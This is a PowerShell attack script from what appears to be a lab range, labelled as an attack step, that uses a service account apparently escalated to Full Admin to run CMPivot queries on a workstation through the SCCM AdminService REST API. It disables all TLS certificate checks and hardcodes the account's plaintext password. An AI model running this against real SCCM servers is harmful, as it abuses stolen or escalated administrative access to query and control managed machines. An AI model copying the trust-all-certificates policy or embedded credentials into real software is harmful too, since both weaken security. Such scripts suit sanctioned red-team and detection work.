# WT037: CMPivot via REST AdminService as svc_sccm (now Full Admin) on WS01 — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy9 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy9

$mp = 'mbr02.range.local'
$resourceId = 16777220   # WS01
$query = 'LogicalDisk'
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))

Write-Output "=== WT037 CMPivot via REST as svc_sccm (Full Admin) on WS01 ==="

# 0. Device read (was 403 before admin grant)
try {
  $r0 = Invoke-WebRequest -Uri "https://$mp/AdminService/v1.0/Device($resourceId)" -Credential $cred -UseBasicParsing -TimeoutSec 25
  Write-Output ("[0] Device read: " + $r0.StatusCode + " :: " + $r0.Content.Substring(0, [Math]::Min(400, $r0.Content.Length)))
} catch {
  $c=0; if ($_.Exception.Response) { $c=[int]$_.Exception.Response.StatusCode }
  Write-Output ("[0] Device read: ERROR " + $c + " : " + $_.Exception.Message)
  exit 1
}

# 1. RunCMPivot
$url = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.RunCMPivot"
$body = "{`"InputQuery`":`"$query`"}"
Write-Output ("[1] POST " + $url)
$r = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType 'application/json' -Credential $cred -UseBasicParsing -TimeoutSec 30
Write-Output ("    status=" + $r.StatusCode)
Write-Output ("    resp=" + $r.Content)
$opId = $null
if ($r.Content -match '"OperationId"\s*:\s*(\d+)') { $opId = $matches[1] }
if (-not $opId) { Write-Output '[!] No OperationId'; exit 1 }
Write-Output ("[+] OperationId=" + $opId)

# 2. Poll results via REST
$resUrl = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.CMPivotResult(OperationId=$opId)"
Write-Output ("[2] Polling " + $resUrl)
$done = $false
for ($i = 1; $i -le 20; $i++) {
  Start-Sleep -Seconds 10
  try {
    $pr = Invoke-WebRequest -Uri $resUrl -Credential $cred -UseBasicParsing -TimeoutSec 15
    if ($pr.StatusCode -eq 200) {
      Write-Output ("[+] Results ready (attempt " + $i + ")")
      Write-Output $pr.Content.Substring(0, [Math]::Min(2000, $pr.Content.Length))
      $done = $true
      break
    }
  } catch {
    $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
    Write-Output ("    attempt " + $i + ": HTTP " + $code)
  }
}
if (-not $done) { Write-Output '[!] Timed out via REST — will check DB' }
Write-Output ("CMPIVOT_REST opId=" + $opId)
